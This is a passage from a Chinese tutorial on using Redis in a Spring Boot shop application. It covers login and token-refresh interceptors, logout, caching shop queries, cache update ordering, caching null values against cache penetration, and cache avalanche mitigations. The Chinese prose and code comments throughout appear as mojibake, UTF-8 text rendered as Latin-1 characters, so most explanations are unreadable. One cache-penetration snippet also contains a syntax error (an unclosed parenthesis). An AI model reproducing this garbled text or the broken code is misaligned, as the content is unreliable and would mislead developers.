stringRedisTemplate.opsForHash().entries(key);\n        // 3.åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n        if(userMap.isEmpty()){\n            return true;\n        }\n        // 4.å°†æŸ¥è¯¢åˆ°çš„hashæ•°æ®è½¬ä¸ºUserDTO\n        UserDTO userDTO = BeanUtil.fillBeanWithMap(userMap, new UserDTO(), false);\n        // 5.å­˜åœ¨ï¼Œä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°Threadlocal\n        UserHolder.saveUser(userDTO);\n        // 6.åˆ·æ–°tokenæœ‰æ•ˆæœŸ\n        stringRedisTemplate.expire(key, LOGIN_USER_TTL, TimeUnit.MINUTES);\n        // 7.æ”¾è¡Œ\n        return true;\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        // ç§»é™¤ç”¨æˆ·\n        UserHolder.removeUser();\n    }\n}\n\t\n```\n\n**LoginInterceptor**\n\n```java\npublic class LoginInterceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        // 1.åˆ¤æ–­æ˜¯å¦éœ€è¦æ‹¦æˆªï¼ˆThreadLocalä¸­æ˜¯å¦æœ‰ç”¨æˆ·ï¼‰\n        if (UserHolder.getUser() == null) {\n            // æ²¡æœ‰ç”¨æˆ·ï¼Œéœ€è¦æ‹¦æˆªï¼Œè®¾ç½®çŠ¶æ€ç \n            response.setStatus(401);\n            // æ‹¦æˆª\n            return false;\n        }\n        // æœ‰ç”¨æˆ·ï¼Œåˆ™æ”¾è¡Œ\n        return true;\n    }\n}\n```\n\n**è®©æ‹¦æˆªå™¨ç”Ÿæ•ˆ**\n\n```java\npackage com.kbdp.config;\n\n@Configuration\npublic class MvcConfig implements WebMvcConfigurer {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        // ç™»å½•æ‹¦æˆªå™¨\n        registry.addInterceptor(new LoginInterceptor())\n                .excludePathPatterns(\n                        \"/shop/**\",\n                        \"/voucher/**\",\n                        \"/shop-type/**\",\n                        \"/upload/**\",\n                        \"/blog/hot\",\n                        \"/user/code\",\n                        \"/user/login\"\n                ).order(1);\n        // tokenåˆ·æ–°çš„æ‹¦æˆªå™¨\n        registry.addInterceptor(new RefreshTokenInterceptor(stringRedisTemplate)).addPathPatterns(\"/**\").order(0);\n    }\n}\n//order()çš„ä½œç”¨æ˜¯è®¾ç½®ä¼˜å…ˆçº§ï¼Œè¶Šå°è¶Šå…ˆæ‰§è¡Œ\n```\n\n### 5.ç™»å‡º\n\n```java\n@Override\npublic Result logout(HttpServletRequest httpServletRequest) {\n  String token = httpServletRequest.getHeader(\"authorization\");\n  String tokenKey = LOGIN_USER_KEY + token;\n  boolean delete = stringRedisTemplate.delete(tokenKey);\n  if (delete){\n    return Result.ok(\"æ³¨é”€æˆåŠŸ\");\n  }else {\n    return Result.ok(\"æ³¨é”€å¤±è´¥\");\n  }\n}\n```\n\n\n\n# â‘¡å•†æˆ·æŸ¥è¯¢ç¼“å­˜\n\n## â¶ç¼“å­˜ç®€ä»‹\n\n**ç¼“å­˜(**Cache)ï¼Œå°±æ˜¯æ•°æ®äº¤æ¢çš„**ç¼“å†²åŒº**,ä¿—ç§°çš„ç¼“å­˜å°±æ˜¯**ç¼“å†²åŒºå†…çš„æ•°æ®**,ä¸€èˆ¬ä»æ•°æ®åº“ä¸­è·å–,å­˜å‚¨äºæœ¬åœ°ä»£ç (ä¾‹å¦‚:\n\n```java\nä¾‹1:Static final ConcurrentHashMap<K,V> map = new ConcurrentHashMap<>(); æœ¬åœ°ç”¨äºé«˜å¹¶å‘\n\nä¾‹2:static final Cache<K,V> USER_CACHE = CacheBuilder.newBuilder().build(); ç”¨äºredisç­‰ç¼“å­˜\n\nä¾‹3:Static final Map<K,V> map =  new HashMap(); æœ¬åœ°ç¼“å­˜\n```\n\nç”±äºå…¶è¢«**Static**ä¿®é¥°ï¼Œæ‰€ä»¥éšç€ç±»çš„åŠ è½½è€Œè¢«åŠ è½½åˆ°**å†…å­˜ä¹‹ä¸­**ï¼Œä½œä¸ºæœ¬åœ°ç¼“å­˜ï¼Œç”±äºå…¶åˆè¢«**final**ä¿®é¥°ï¼Œæ‰€ä»¥å…¶å¼•ç”¨(ä¾‹3:map)å’Œå¯¹è±¡(ä¾‹3:new HashMap())ä¹‹é—´çš„å…³ç³»æ˜¯å›ºå®šçš„ï¼Œä¸èƒ½æ”¹å˜ï¼Œå› æ­¤ä¸ç”¨æ‹…å¿ƒèµ‹å€¼(=)å¯¼è‡´ç¼“å­˜å¤±æ•ˆ;\n\n**ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ç¼“å­˜**\n\nç¼“å­˜æ•°æ®å­˜å‚¨äºä»£ç ä¸­ï¼Œè€Œä»£ç è¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œå†…å­˜çš„è¯»å†™æ€§èƒ½è¿œé«˜äºç£ç›˜ï¼Œç¼“å­˜å¯ä»¥å¤§å¤§é™ä½**ç”¨æˆ·è®¿é—®å¹¶å‘é‡å¸¦æ¥çš„**æœåŠ¡å™¨è¯»å†™å‹åŠ›\n\n| ç¼“å­˜ä¼˜ç‚¹                                    | ç¼“å­˜ç¼ºç‚¹                                   |\n| :------------------------------------------ | ------------------------------------------ |\n| é™ä½åç«¯è´Ÿè½½ <br>æé«˜è¯»å†™æ•ˆç‡ï¼Œé™ä½å“åº”æ—¶é—´ | æ•°æ®ä¸€è‡´æ€§æˆæœ¬<br>ä»£ç ç»´æŠ¤æˆæœ¬<br>è¿ç»´æˆæœ¬ |\n\n**å¦‚ä½•ä½¿ç”¨ç¼“å­˜**\n\nå®é™…å¼€å‘ä¸­ï¼Œä¼šæ„ç­‘å¤šçº§ç¼“å­˜æ¥ä½¿ç³»ç»Ÿè¿è¡Œé€Ÿåº¦è¿›ä¸€æ­¥æå‡ï¼Œä¾‹å¦‚ï¼šæœ¬åœ°ç¼“å­˜ä¸redisä¸­çš„ç¼“å­˜å¹¶å‘ä½¿ç”¨\n\n- **æµè§ˆå™¨ç¼“å­˜**ï¼šä¸»è¦æ˜¯å­˜åœ¨äºæµè§ˆå™¨ç«¯çš„ç¼“å­˜\n\n- **åº”ç”¨å±‚ç¼“å­˜ï¼š**å¯ä»¥åˆ†ä¸ºtomcatæœ¬åœ°ç¼“å­˜ï¼Œæ¯”å¦‚ä¹‹å‰æåˆ°çš„mapï¼Œæˆ–è€…æ˜¯ä½¿ç”¨redisä½œä¸ºç¼“å­˜\n\n- **æ•°æ®åº“ç¼“å­˜ï¼š**åœ¨æ•°æ®åº“ä¸­æœ‰ä¸€ç‰‡ç©ºé—´æ˜¯ buffer poolï¼Œå¢æ”¹æŸ¥æ•°æ®éƒ½ä¼šå…ˆåŠ è½½åˆ°mysqlçš„ç¼“å­˜ä¸­\n\n- **CPUç¼“å­˜ï¼š**å½“ä»£è®¡ç®—æœºæœ€å¤§çš„é—®é¢˜æ˜¯ cpuæ€§èƒ½æå‡äº†ï¼Œä½†å†…å­˜è¯»å†™é€Ÿåº¦æ²¡æœ‰è·Ÿä¸Šï¼Œæ‰€ä»¥ä¸ºäº†é€‚åº”å½“ä¸‹çš„æƒ…å†µï¼Œå¢åŠ äº†cpuçš„L1ï¼ŒL2ï¼ŒL3çº§çš„ç¼“å­˜\n\n![](../images/Redis-å®æˆ˜ç¯‡/image-20220523212915666.png)\n\n## â·æ·»åŠ å•†æˆ·ç¼“å­˜\n\nåœ¨æˆ‘ä»¬æŸ¥è¯¢å•†æˆ·ä¿¡æ¯æ—¶ï¼Œæ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­å»è¿›è¡ŒæŸ¥è¯¢çš„ï¼Œç›´æ¥æŸ¥è¯¢æ•°æ®åº“é‚£è‚¯å®šæ…¢å’¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¢åŠ ç¼“å­˜\n\n```java\n@GetMapping(\"/{id}\")\npublic Result queryShopById(@PathVariable(\"id\") Long id) {\n    //è¿™é‡Œæ˜¯ç›´æ¥æŸ¥è¯¢æ•°æ®åº“\n    return Result.ok(shopService.getById(id));\n}\n```\n\n### 1.ç¼“å­˜æ€è·¯\n\næ ‡å‡†çš„æ“ä½œæ–¹å¼å°±æ˜¯æŸ¥è¯¢æ•°æ®åº“ä¹‹å‰å…ˆæŸ¥è¯¢ç¼“å­˜ï¼Œå¦‚æœç¼“å­˜æ•°æ®å­˜åœ¨ï¼Œåˆ™ç›´æ¥ä»ç¼“å­˜ä¸­è¿”å›ï¼Œå¦‚æœç¼“å­˜æ•°æ®ä¸å­˜åœ¨ï¼Œå†æŸ¥è¯¢æ•°æ®åº“ï¼Œç„¶åå°†æ•°æ®å­˜å…¥redisã€‚\n\n![](https://img.jwt1399.top/img/202210311652776.png)\n\n### 2.ä»£ç å®ç°\n\n```java\n@GetMapping(\"/{id}\")\npublic Result queryShopById(@PathVariable(\"id\") Long id) {\n    //return Result.ok(shopService.getById(id)); //è¿™é‡Œæ˜¯ç›´æ¥æŸ¥è¯¢æ•°æ®åº“\n    return shopService.queryById(id); //ç¼“å­˜å®ç°\n}\n```\n\n```java\n@Service\npublic class ShopServiceImpl extends ServiceImpl<ShopMapper, Shop> implements IShopService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result queryById(Long id) {\n        String key = CACHE_SHOP_KEY + id;\n        // 1.ä»redis æŸ¥è¯¢å•†é“ºç¼“å­˜\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n            Shop shop = JSONUtil.toBean(shopJson, Shop.class);\n            return Result.ok(shop);\n        }\n        // 4.ä¸å­˜åœ¨ï¼Œæ ¹æ®idæŸ¥è¯¢æ•°æ®åº“\n        Shop shop = getById(id);\n        // 5.æ•°æ®åº“ä¹Ÿä¸å­˜åœ¨ï¼Œè¿”å›é”™è¯¯\n        if (shop == null) {\n            return Result.fail(\"åº—é“ºä¸å­˜åœ¨ï¼\");\n        }\n        // 6.æ•°æ®åº“å­˜åœ¨ï¼Œå†™å…¥redis\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop));\n        // 7.è¿”å›\n        return Result.ok(shop);\n    }\n}\n```\n\n## â¸ç¼“å­˜æ›´æ–°ç­–ç•¥\n\n### 1.æ›´æ–°ç­–ç•¥\n\n**ç¼“å­˜æ›´æ–°**æ˜¯Redisä¸ºäº†èŠ‚çº¦å†…å­˜è€Œè®¾è®¡å‡ºæ¥çš„ä¸€ä¸ªä¸œè¥¿ï¼Œä¸»è¦æ˜¯å› ä¸ºå†…å­˜æ•°æ®å®è´µï¼Œå½“æˆ‘ä»¬å‘redisæ’å…¥å¤ªå¤šæ•°æ®ï¼Œæ­¤æ—¶å°±å¯èƒ½ä¼šå¯¼è‡´ç¼“å­˜ä¸­çš„æ•°æ®è¿‡å¤šï¼Œæ‰€ä»¥redisä¼šå¯¹éƒ¨åˆ†æ•°æ®è¿›è¡Œæ›´æ–°ã€‚æœ‰ä¸‰ç§æ›´æ–°æ–¹æ³•ï¼š\n\n- **å†…å­˜æ·˜æ±°ï¼š**redisè‡ªåŠ¨è¿›è¡Œï¼Œå½“rediså†…å­˜è¾¾åˆ°å’±ä»¬è®¾å®šçš„max-memeryçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è§¦å‘æ·˜æ±°æœºåˆ¶ï¼Œæ·˜æ±°æ‰ä¸€äº›ä¸é‡è¦çš„æ•°æ®(å¯ä»¥è‡ªå·±è®¾ç½®ç­–ç•¥æ–¹å¼)\n\n- **è¶…æ—¶å‰”é™¤ï¼š**å½“æˆ‘ä»¬ç»™redisè®¾ç½®äº†è¿‡æœŸæ—¶é—´ttlä¹‹åï¼Œredisä¼šå°†è¶…æ—¶çš„æ•°æ®è¿›è¡Œåˆ é™¤ï¼Œæ–¹ä¾¿ç»§ç»­ä½¿ç”¨ç¼“å­˜\n\n- **ä¸»åŠ¨æ›´æ–°ï¼š**æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨è°ƒç”¨æ–¹æ³•æŠŠç¼“å­˜åˆ æ‰ï¼Œé€šå¸¸ç”¨äºè§£å†³ç¼“å­˜å’Œæ•°æ®åº“ä¸ä¸€è‡´é—®é¢˜\n\n![](../images/Redis-å®æˆ˜ç¯‡/1653322506393.png)\n\n**æ•°æ®ä¸ä¸€è‡´è§£å†³æ–¹æ¡ˆ**\n\n> ç”±äºæˆ‘ä»¬çš„**ç¼“å­˜çš„æ•°æ®æºæ¥è‡ªäºæ•°æ®åº“**ï¼Œè€Œæ•°æ®åº“çš„**æ•°æ®æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„**ï¼Œå› æ­¤ï¼Œå¦‚æœå½“æ•°æ®åº“ä¸­**æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œè€Œç¼“å­˜å´æ²¡æœ‰åŒæ­¥**ï¼Œæ­¤æ—¶å°±ä¼šæœ‰**ä¸€è‡´æ€§é—®é¢˜å­˜åœ¨**ï¼Œå…¶åæœæ˜¯ï¼šç”¨æˆ·ä½¿ç”¨ç¼“å­˜ä¸­çš„è¿‡æ—¶æ•°æ®ï¼Œå°±ä¼šäº§ç”Ÿç±»ä¼¼å¤šçº¿ç¨‹æ•°æ®å®‰å…¨é—®é¢˜ï¼Œä»è€Œå½±å“ä¸šåŠ¡ï¼Œäº§å“å£ç¢‘ç­‰ï¼›æ€ä¹ˆè§£å†³å‘¢ï¼Ÿæœ‰å¦‚ä¸‹å‡ ç§æ–¹æ¡ˆ\n\n- Cache Aside Pattern ï¼šç¼“å­˜è°ƒç”¨è€…åœ¨æ›´æ–°å®Œæ•°æ®åº“åå†å»æ›´æ–°ç¼“å­˜ï¼Œä¹Ÿç§°ä¹‹ä¸ºåŒå†™æ–¹æ¡ˆ\n\n- Read/Write Through Pattern : ç”±ç³»ç»Ÿæœ¬èº«å®Œæˆï¼Œæ•°æ®åº“ä¸ç¼“å­˜çš„é—®é¢˜äº¤ç”±ç³»ç»Ÿæœ¬èº«å»å¤„ç†\n\n- Write Behind Caching Pattern ï¼šè°ƒç”¨è€…åªæ“ä½œç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹å»å¼‚æ­¥å¤„ç†æ•°æ®åº“ï¼Œå®ç°æœ€ç»ˆä¸€è‡´\n\nç»¼åˆè€ƒè™‘ä½¿ç”¨æ–¹æ¡ˆä¸€ï¼Œä½†æ˜¯æ“ä½œç¼“å­˜å’Œæ•°æ®åº“æ—¶æœ‰ä¸‰ä¸ªé—®é¢˜éœ€è¦è€ƒè™‘ï¼š\n\nå¦‚æœé‡‡ç”¨ç¬¬ä¸€ä¸ªæ–¹æ¡ˆï¼Œé‚£ä¹ˆå‡è®¾æˆ‘ä»¬æ¯æ¬¡æ“ä½œæ•°æ®åº“åï¼Œéƒ½æ“ä½œç¼“å­˜ï¼Œä½†æ˜¯ä¸­é—´å¦‚æœæ²¡æœ‰äººæŸ¥è¯¢ï¼Œé‚£ä¹ˆè¿™ä¸ªæ›´æ–°åŠ¨ä½œå®é™…ä¸Šåªæœ‰æœ€åä¸€æ¬¡ç”Ÿæ•ˆï¼Œä¸­é—´çš„æ›´æ–°åŠ¨ä½œæ„ä¹‰å¹¶ä¸å¤§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç¼“å­˜åˆ é™¤ï¼Œç­‰å¾…å†æ¬¡æŸ¥è¯¢æ—¶ï¼Œå°†ç¼“å­˜ä¸­çš„æ•°æ®åŠ è½½å‡ºæ¥\n\n* 1.åˆ é™¤ç¼“å­˜è¿˜æ˜¯æ›´æ–°ç¼“å­˜ï¼Ÿ\n  * æ›´æ–°ç¼“å­˜ï¼šæ¯æ¬¡æ›´æ–°æ•°æ®åº“éƒ½æ›´æ–°ç¼“å­˜ï¼Œæ— æ•ˆå†™æ“ä½œè¾ƒå¤š\n  * åˆ é™¤ç¼“å­˜ï¼šæ›´æ–°æ•°æ®åº“æ—¶è®©ç¼“å­˜å¤±æ•ˆï¼ŒæŸ¥è¯¢æ—¶å†æ›´æ–°ç¼“å­˜\n\n* 2.å¦‚ä½•ä¿è¯ç¼“å­˜ä¸æ•°æ®åº“çš„æ“ä½œçš„åŒæ—¶æˆåŠŸæˆ–å¤±è´¥ï¼Ÿ\n  * å•ä½“ç³»ç»Ÿï¼Œå°†ç¼“å­˜ä¸æ•°æ®åº“æ“ä½œæ”¾åœ¨ä¸€ä¸ªäº‹åŠ¡\n  * åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œåˆ©ç”¨TCCç­‰åˆ†å¸ƒå¼äº‹åŠ¡æ–¹æ¡ˆ\n\n* 3.å…ˆæ“ä½œç¼“å­˜è¿˜æ˜¯å…ˆæ“ä½œæ•°æ®åº“ï¼Ÿ\n  * å…ˆåˆ é™¤ç¼“å­˜ï¼Œå†æ“ä½œæ•°æ®åº“\n  * å…ˆæ“ä½œæ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜\n\næˆ‘ä»¬åº”å½“æ˜¯å…ˆæ“ä½œæ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ï¼ŒåŸå› åœ¨äºï¼Œå¦‚æœä½ é€‰æ‹©ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œåœ¨ä¸¤ä¸ªçº¿ç¨‹å¹¶å‘æ¥è®¿é—®æ—¶ï¼Œå‡è®¾çº¿ç¨‹1å…ˆæ¥ï¼Œä»–å…ˆæŠŠç¼“å­˜åˆ äº†ï¼Œæ­¤æ—¶çº¿ç¨‹2è¿‡æ¥ï¼Œä»–æŸ¥è¯¢ç¼“å­˜æ•°æ®å¹¶ä¸å­˜åœ¨ï¼Œæ­¤æ—¶ä»–å†™å…¥ç¼“å­˜ï¼Œå½“ä»–å†™å…¥ç¼“å­˜åï¼Œçº¿ç¨‹1å†æ‰§è¡Œæ›´æ–°åŠ¨ä½œæ—¶ï¼Œå®é™…ä¸Šå†™å…¥çš„å°±æ˜¯æ—§çš„æ•°æ®ï¼Œæ–°çš„æ•°æ®è¢«æ—§æ•°æ®è¦†ç›–äº†ã€‚\n\n![](../images/Redis-å®æˆ˜ç¯‡/1653323595206.png)\n\n### 2.ä»£ç å®ç°\n\næ ¸å¿ƒæ€è·¯å¦‚ä¸‹ï¼š\n\n- 1.æ ¹æ®idæŸ¥è¯¢åº—é“ºæ—¶ï¼Œå¦‚æœç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢æ•°æ®åº“ï¼Œå°†æ•°æ®åº“ç»“æœå†™å…¥ç¼“å­˜ï¼Œå¹¶**è®¾ç½®è¶…æ—¶æ—¶é—´**\n\n- 2.æ ¹æ®idä¿®æ”¹åº—é“ºæ—¶ï¼Œ**å…ˆä¿®æ”¹æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜**\n\n**1.è®¾ç½®redisç¼“å­˜æ—¶æ·»åŠ è¿‡æœŸæ—¶é—´**\n\n```java\n@Service\npublic class ShopServiceImpl extends ServiceImpl<ShopMapper, Shop> implements IShopService {\n\n    @Resource\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public Result queryById(Long id) {\n         ......\n         // 6.æ•°æ®åº“å­˜åœ¨ï¼Œå†™å…¥redisï¼Œå¹¶æ·»åŠ è¿‡æœŸæ—¶é—´\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);\n        ......\n    }\n}\n```\n\n**2.æ ¹æ®idä¿®æ”¹åº—é“ºæ—¶ï¼Œå…ˆä¿®æ”¹æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜**\n\n```java\n@Override\n@Transactional\npublic Result update(Shop shop) {\n    Long id = shop.getId();\n    if(id == null){\n      return Result.fail(\"åº—é“ºidä¸èƒ½ä¸ºç©ºï¼\");\n    }\n    // 1.æ›´æ–°æ•°æ®åº“\n    updateById(shop);\n    // 2.åˆ é™¤ç¼“å­˜\n    stringRedisTemplate.delete(CACHE_SHOP_KEY + id);\n    return Result.ok();\n}\n```\n\nä»£ç åˆ†æï¼šå½“æˆ‘ä»¬ä¿®æ”¹äº†æ•°æ®ä¹‹åï¼Œç„¶åæŠŠç¼“å­˜ä¸­çš„æ•°æ®è¿›è¡Œåˆ é™¤ï¼ŒæŸ¥è¯¢æ—¶å‘ç°ç¼“å­˜ä¸­æ²¡æœ‰æ•°æ®ï¼Œåˆ™ä¼šä»mysqlä¸­åŠ è½½æœ€æ–°çš„æ•°æ®ï¼Œä»è€Œé¿å…æ•°æ®åº“å’Œç¼“å­˜ä¸ä¸€è‡´çš„é—®é¢˜ã€‚\n\n## â¹ç¼“å­˜ç©¿é€\n\n> ç¼“å­˜ç©¿é€æ˜¯æŒ‡å®¢æˆ·ç«¯è¯·æ±‚çš„**æ•°æ®åœ¨ç¼“å­˜ä¸­å’Œæ•°æ®åº“ä¸­éƒ½ä¸å­˜åœ¨**ï¼Œè¿™æ ·ç¼“å­˜æ°¸è¿œä¸ä¼šç”Ÿæ•ˆï¼Œè¿™äº›è¯·æ±‚éƒ½ä¼šæ‰“åˆ°æ•°æ®åº“ã€‚\n\n### 1.è§£å†³æ€è·¯\n\nç¼“å­˜ç©¿é€çš„è§£å†³æ–¹æ¡ˆæœ‰å“ªäº›ï¼Ÿ\n\n- ç¼“å­˜nullå€¼\n- å¸ƒéš†è¿‡æ»¤\n- å¢å¼ºidçš„å¤æ‚åº¦ï¼Œé¿å…è¢«çŒœæµ‹idè§„å¾‹\n- åšå¥½æ•°æ®çš„åŸºç¡€æ ¼å¼æ ¡éªŒ\n- åŠ å¼ºç”¨æˆ·æƒé™æ ¡éªŒ\n- åšå¥½çƒ­ç‚¹å‚æ•°çš„é™æµ\n\nå¸¸è§çš„è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼š\n\n|      | ç¼“å­˜ç©ºå¯¹è±¡                             | å¸ƒéš†è¿‡æ»¤å™¨                |\n| :--: | -------------------------------------- | ------------------------- |\n| ä¼˜ç‚¹ | å®ç°ç®€å•ï¼Œç»´æŠ¤æ–¹ä¾¿                     | å†…å­˜å ç”¨è¾ƒå°‘ï¼Œæ²¡æœ‰å¤šä½™key |\n| ç¼ºç‚¹ | é¢å¤–çš„å†…å­˜æ¶ˆè€—<br>å¯èƒ½é€ æˆçŸ­æœŸçš„ä¸ä¸€è‡´ | å®ç°å¤æ‚<br/>å­˜åœ¨è¯¯åˆ¤å¯èƒ½ |\n\n**ç¼“å­˜ç©ºå¯¹è±¡ï¼š**å“ªæ€•è¿™ä¸ªæ•°æ®åœ¨æ•°æ®åº“ä¸­ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬ä¹ŸæŠŠè¿™ä¸ªæ•°æ®å­˜å…¥åˆ°redisä¸­å»ï¼Œè¿™æ ·ï¼Œä¸‹æ¬¡ç”¨æˆ·è¿‡æ¥è®¿é—®è¿™ä¸ªä¸å­˜åœ¨çš„æ•°æ®ï¼Œé‚£ä¹ˆåœ¨redisä¸­ä¹Ÿèƒ½æ‰¾åˆ°è¿™ä¸ªæ•°æ®\n\n**å¸ƒéš†è¿‡æ»¤å™¨ï¼š**é€šè¿‡ä¸€ä¸ªåºå¤§çš„äºŒè¿›åˆ¶æ•°ç»„ï¼Œèµ°å“ˆå¸Œæ€æƒ³å»åˆ¤æ–­å½“å‰è¿™ä¸ªè¦æŸ¥è¯¢çš„è¿™ä¸ªæ•°æ®æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­å­˜åœ¨ï¼Œåˆ™æ”¾è¡Œï¼›ä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥è¿”å›\n\nè¿™ç§æ–¹å¼ä¼˜ç‚¹åœ¨äºèŠ‚çº¦å†…å­˜ç©ºé—´ï¼Œä½†å­˜åœ¨è¯¯åˆ¤ï¼Œè¯¯åˆ¤åŸå› åœ¨äºï¼šå¸ƒéš†è¿‡æ»¤å™¨èµ°çš„æ˜¯å“ˆå¸Œæ€æƒ³ï¼Œå¯èƒ½å­˜åœ¨å“ˆå¸Œå†²çª\n\n![](https://img.jwt1399.top/img/202211021526445.png)\n\n### 2.å…·ä½“å®ç°\n\nåŸæ¥çš„é€»è¾‘ä¸­ï¼Œå¦‚æœå‘ç°è¿™ä¸ªæ•°æ®åœ¨mysqlä¸­ä¸å­˜åœ¨ï¼Œç›´æ¥å°±è¿”å›404äº†ï¼Œè¿™æ ·æ˜¯ä¼šå­˜åœ¨ç¼“å­˜ç©¿é€é—®é¢˜çš„\n\nç°åœ¨çš„é€»è¾‘ä¸­ï¼šå¦‚æœè¿™ä¸ªæ•°æ®ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬ä¸ä¼šè¿”å›404 ï¼Œè¿˜æ˜¯ä¼šæŠŠè¿™ä¸ªæ•°æ®å†™å…¥åˆ°Redisä¸­ï¼Œå¹¶ä¸”å°†valueè®¾ç½®ä¸ºç©ºï¼Œæ¬§å½“å†æ¬¡å‘èµ·æŸ¥è¯¢æ—¶ï¼Œæˆ‘ä»¬å¦‚æœå‘ç°å‘½ä¸­ä¹‹åï¼Œåˆ¤æ–­è¿™ä¸ªvalueæ˜¯å¦æ˜¯nullï¼Œå¦‚æœæ˜¯nullï¼Œåˆ™æ˜¯ä¹‹å‰å†™å…¥çš„æ•°æ®ï¼Œè¯æ˜æ˜¯ç¼“å­˜ç©¿é€æ•°æ®ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ç›´æ¥è¿”å›æ•°æ®ã€‚\n\n![](https://img.jwt1399.top/img/202211021536810.png)\n\n```java\n\t\t@Override\n    public Result queryById(Long id) {\n        String key = CACHE_SHOP_KEY + id;\n        // 1.ä»redis æŸ¥è¯¢å•†é“ºç¼“å­˜\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼ˆ3ç§æƒ…å†µï¼Œå­˜åœ¨ä¸ä¸ºç©ºï¼Œå­˜åœ¨ä½†ä¸º\"\"ï¼Œä¸å­˜åœ¨ä¸ºnullï¼‰\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n            Shop shop = JSONUtil.toBean(shopJson, Shop.class);\n            return Result.ok(shop);\n        }\n        //åˆ¤æ–­å‘½ä¸­çš„æ˜¯å¦æ˜¯ç©ºå€¼(åŒºåˆ«nullå’Œ\"\")\n        /*æ–°å¢è¯­å¥*/\n        if (\"\".equals(shopJson){\n          return Result.fail(\"åº—é“ºä¿¡æ¯ä¸å­˜åœ¨ï¼\");\n        }\n      \n        // 4.ä¸å­˜åœ¨ï¼Œæ ¹æ®idæŸ¥è¯¢æ•°æ®åº“\n        Shop shop = getById(id);\n        // 5.æ•°æ®åº“ä¹Ÿä¸å­˜åœ¨ï¼Œè¿”å›é”™è¯¯\n        if (shop == null) {\n            /*æ–°å¢è¯­å¥*/\n            //ä¸å­˜åœ¨æ—¶å­˜å…¥ç©ºå€¼\n            stringRedisTemplate.opsForValue().set(key,\"\",CACHE_NULL_TTL,TimeUnit.MINUTES);\n            return Result.fail(\"åº—é“ºä¸å­˜åœ¨ï¼\");\n        }\n        // 6.æ•°æ®åº“å­˜åœ¨ï¼Œå†™å…¥redis\n        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);\n        // 7.è¿”å›\n        return Result.ok(shop);\n    }\n```\n\nåˆ†æï¼šå½“æŸ¥è¯¢çš„æ•°æ®åœ¨æ•°æ®åº“å’ŒRedisä¸­éƒ½ä¸å­˜åœ¨æ—¶ï¼Œä¼šåœ¨Redisä¸­å­˜å…¥ç©ºå€¼ï¼Œå¹¶è¿”å›â€œåº—é“ºä¸å­˜åœ¨ï¼â€ï¼Œå½“å†æ¬¡æŸ¥è¯¢è¯¥æ•°æ®å°±ä¸å†ç»è¿‡æ•°æ®åº“ï¼Œè€Œæ˜¯å»Redisä¸­å–ï¼Œå¹¶è¿”å›â€œåº—é“ºä¿¡æ¯ä¸å­˜åœ¨ï¼â€\n\n## âºç¼“å­˜é›ªå´©\n\n> ç¼“å­˜é›ªå´©æ˜¯æŒ‡åœ¨**åŒä¸€æ—¶æ®µå¤§é‡çš„ç¼“å­˜keyåŒæ—¶å¤±æ•ˆæˆ–è€…RedisæœåŠ¡å®•æœº**ï¼Œå¯¼è‡´å¤§é‡è¯·æ±‚åˆ°è¾¾æ•°æ®åº“ï¼Œå¸¦æ¥å·¨å¤§å‹åŠ›ã€‚\n\n### è§£å†³æ€è·¯\n\n* ç»™ä¸åŒçš„Keyçš„TTLæ·»åŠ éšæœºå€¼\n* åˆ©ç”¨Redisé›†ç¾¤æé«˜æœåŠ¡çš„å¯ç”¨æ€§\n* ç»™ç¼“å­˜ä¸šåŠ¡æ·»åŠ é™çº§é™æµç­–ç•¥\n* ç»™ä¸šåŠ¡æ·»åŠ å¤šçº§ç¼“å­˜\n\n## â»ç¼“å­˜å‡»ç©¿\n\n> 